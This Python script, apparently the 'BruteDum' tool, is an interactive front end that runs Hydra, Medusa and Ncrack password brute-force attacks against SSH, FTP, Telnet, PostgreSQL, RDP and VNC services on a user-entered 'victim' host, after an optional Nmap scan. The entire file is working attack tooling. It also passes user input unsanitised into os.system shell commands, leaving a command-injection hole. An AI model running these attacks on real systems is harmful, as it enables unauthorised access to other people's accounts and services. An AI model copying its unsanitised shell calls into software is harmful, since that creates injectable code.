#!/usr/bin/python3

import socket
from os import system, name, path

class Color:
    no_colored = "\033[0m"
    white_bold = "\033[1;37m"
    blue_bold = "\033[1;96m"
    green_bold = "\033[1;92m"
    red_bold = "\033[1;91m"
    yellow_bold = "\033[1;33m"

def banner():
    print(Color.yellow_bold+"""888888                           888888                """+Color.no_colored+"""BRUTE            
"""+Color.yellow_bold+"""8    8   eeeee  e   e eeeee eeee 8    8 e   e eeeeeee  """+Color.no_colored+"""FORCE
"""+Color.yellow_bold+"""8eeee8ee 8   8  8   8   8   8    8e   8 8   8 8  8  8  """+Color.no_colored+"""JUST
"""+Color.yellow_bold+"""88     8 8eee8e 8e  8   8e  8eee 88   8 8e  8 8e 8  8  """+Color.no_colored+"""FOR
"""+Color.yellow_bold+"""88     8 88   8 88  8   88  88   88   8 88  8 88 8  8  """+Color.no_colored+"""THE
"""+Color.yellow_bold+"""88eeeee8 88   8 88ee8   88  88ee 88eee8 88ee8 88 8  8  """+Color.no_colored+"""DUMMIES

"""+Color.yellow_bold+"""[i]"""+Color.no_colored+""" BruteDum - Brute Force attacks SSH, FTP, Telnet, PostgreSQL, RDP, VNC with Hydra, Medusa and Ncrack
    Author: """+Color.yellow_bold+"""https://GitHackTools.blogspot.com \n""")

def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')


def invalid_choice():
    print(Color.red_bold+"[!]"+Color.no_colored+" Invalid choice \n"+Color.white_bold+"Exiting...",exit())


def info(victim, protocol):
    print(Color.yellow_bold+'[i]'+Color.no_colored+' Target: '+Color.white_bold+'{}'.format(victim))
    print(Color.no_colored+'    Protocol: '+Color.white_bold+'{}'.format(protocol))


def about():
    print(Color.yellow_bold+"[i]"+Color.no_colored+" Remember to coder:")
    print("    Website: "+Color.yellow_bold+"https://githacktools.blogspot.com",Color.no_colored)
    print("    Facebook: "+Color.yellow_bold+"@GitHackTools",Color.no_colored)
    print("    Twitter: "+Color.yellow_bold+"@SecureGF",Color.no_colored, exit())


def continue_or_not():
    try:
        print()
        choice = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to continue? [Y/n]:'+Color.white_bold+' '))

        if choice[0].upper() == 'Y':
            clear()
            banner()
            start()
        else:
            print()
            about()

    except (KeyboardInterrupt, IndexError):
        print()
        about()


def check_port(victim, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = sock.connect_ex((victim,port))

    if port == 0:
        sock.close
        return True
    else:
        sock.close
        return False


def change_port(victim):
    try:
        port = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the port you want to crack:'+Color.white_bold+' '))

        if check_port(victim, port) == True:
            return port
        else:
            print(Color.red_bold+"[!]"+Color.no_colored+" That port is not open")
            print()
            change_port(victim)


    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except ValueError:
        print(Color.red_bold+'[!]'+Color.no_colored+' Invalid input')
        change_port(victim)


def username(choice):
    try:
        if choice == 'Y':
            user_path = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the path of user list:'+Color.white_bold+' '))
            user_path = user_path.strip()

            if path.isfile(user_path) == True:
                return user_path
            else:
                print(Color.red_bold+"[!]"+Color.no_colored+" That path is doesn't exist")
                username(choice)

        elif choice == 'N':
            user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the username: '+Color.white_bold))
            return user

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def password():
    try:
        wordlist_path = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the path of wordlist:'+Color.white_bold+' '))
        wordlist_path = wordlist_path.strip()

        if path.isfile(wordlist_path) == True:
            return wordlist_path
        else:
            print(Color.red_bold+"[!]"+Color.no_colored+" That path os doesn't exist")
            password()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def start():
    try:
        victim = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the victim address:'+Color.white_bold+' '))

        if len(victim) == 0:
            print(Color.red_bold+"[!]"+Color.no_colored+" Invalid input")
            start()  

        else:
            choice = str(input(Color.blue_bold+"[?]"+Color.no_colored+" Do you want to scan victim's ports with Nmap? [Y/n]:"+Color.white_bold+" "))

            if choice[0].upper() == 'Y':
                clear()
                print(Color.green_bold+'[+]'+Color.no_colored+' Scanning ports with Nmap...\n')
                system('nmap {}'.format(victim))
                menu(victim)

            elif choice[0].upper() == "N":
                menu(victim)
            else:
                invalid_choice()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def menu(victim):
    try:
        print(Color.white_bold+"""
    [1] FTP                       [2] Telnet 
        (Default port is 21)          (Default port is 23)
    [3] PostgreSQL                [4] SSH     
        (Default port is 5432)        (Default port is 22)
    [5] RDP                       [6] VNC
        (Default port is 3389)        (Default port is 5900)\n""",Color.no_colored)
        protocol = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Which protocol do you want to crack? [1-6]:'+Color.white_bold+' '))
        
        if protocol == 1:
            menu_tool(victim,"ftp")
        elif protocol == 2:
            menu_tool(victim, "telnet")
        elif protocol == 3:
            menu_tool(victim, "postgres")
        elif protocol == 4:
            menu_tool(victim, "ssh")
        elif protocol == 5:
            menu_tool(victim, "rdp")
        elif protocol == 6:
            menu_tool(victim, "vnc")
        else:
            clear()
            print(Color.red_bold+'[!]'+Color.no_colored+' Please re-enter your choice')
            menu(victim)
      
    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except ValueError:
        invalid_choice()


def menu_tool(victim, protocol):
    try:
        clear()
        banner()
        info(victim, protocol)
        if protocol == "postgres":
            print(Color.white_bold+"""\n    [1] Ncrack (Only support default port)
    [2] Hydra (Recommended)
    [3] Medusa\n"""+Color.no_colored)

        else:
            print(Color.white_bold+"""\n    [1] Ncrack
    [2] Hydra (Recommended)
    [3] Medusa\n"""+Color.no_colored)

        tool = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Which tool do you want to use? [1-3]:'+Color.white_bold+' '))

        if tool == 1:
            ncrack(victim, protocol)
        elif tool == 2:
            hydra(victim, protocol)
        elif tool == 3:
            medusa(victim, protocol)
        else:
            invalid_choice()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except ValueError:
        invalid_choice()


def ncrack(victim, protocol):
    try:
        clear()
        banner()
        info(victim, protocol)

        if protocol == "postgres":
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))
            
            if choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                system('ncrack -v --user "{}" -P {} {}:5432'.format(user, wordlist, victim))

            elif choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                system('ncrack -v -U {} -P {} {}:5432'.format(user_path, wordlist, victim))

            else:
                invalid_choice()
                
        elif protocol == "vnc":
            wordlist = password()
            choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]'))
            
            if choice_port[0].upper() == 'N':
                port = change_port(victim)
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                system('ncrack -v -P {} vnc://{}:{}'.format(wordlist, victim, port))
                
            elif choice_port[0].upper() == 'Y':
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                system('ncrack -v -P {} {}:5900'.format(wordlist, victim))
                
            else:
                invalid_choice()
                
        else:
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

            if choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v --user "{}" -P {} {}://{}'.format(user, wordlist, protocol, victim))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v --user "{}" -P {} {}://{}:{}'.format(user, wordlist, protocol, victim, port))

                else:
                    invalid_choice()

            elif choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v -U {} -P {} {}://{}'.format(user_path, wordlist, protocol, victim))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v -U {} -P {} {}://{}:{}'.format(user_path, wordlist, protocol, victim, port))

            else:
                invalid_choice()

        continue_or_not()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def medusa(victim, protocol):
    try:
        clear()
        banner()
        info(victim, protocol)
        
        if protocol == "vnc":
            wordlist = password()
            choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))
			
            if choice_port[0].upper() == 'Y':
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                system('medusa -P {} -h {} -M {}'.format(wordlist, victim, protocol))

            elif choice_port[0].upper() == 'N':
                port = change_port(victim)
                clear()
                print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                system('medusa -P {} -h {} -M {} -n {}'.format(wordlist, victim, protocol, port))

            else:
                invalid_choice()
                
        else:
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

            if choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                    system('medusa -U {} -P {} -h {} -M {}'.format(user_path, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                    system('medusa -U {} -P {} -h {} -M {} -n {}'.format(user_path, wordlist, victim, protocol, port))

                else:
                    invalid_choice()


            elif choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                    system('medusa -u "{}" -P {} -h {} -M {}'.format(user, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                    system('medusa -u "{}" -P {} -h {} -M {} -n {}'.format(user, wordlist, victim, protocol, port))

                else:
                    invalid_choice()

            else:
                invalid_choice()

        continue_or_not()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def hydra(victim, protocol):
    try:
        clear()
        banner()
        info(victim, protocol)

        if protocol == "vnc":
            wordlist = password()
            choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

            if choice_port[0].upper() == 'Y':
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                system('hydra -P {} {} {} -I'.format(wordlist, victim, protocol))

            elif choice_port[0].upper() == 'N':
                port = change_port(victim)
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                system('hydra -P {} {} {} -s {} -I'.format(wordlist, victim, protocol, port))

            else:
                invalid_choice()

        else:
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))
        
            if choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                    system('hydra -L {} -P {} {} {} -I'.format(user_path, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                    system('hydra -L {} -P {} {} {} -s {} -I'.format(user_path, wordlist, victim, protocol, port))

                else:
                    invalid_choice()


            elif choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                    system('hydra -l "{}" -P {} {} {} -I'.format(user, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                    system('hydra -l "{}" -P {} {} -s {} {} -I'.format(user, wordlist, victim, port, protocol))

                else:
                    invalid_choice()

            else:
                invalid_choice()

        continue_or_not()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


clear()
banner()
start()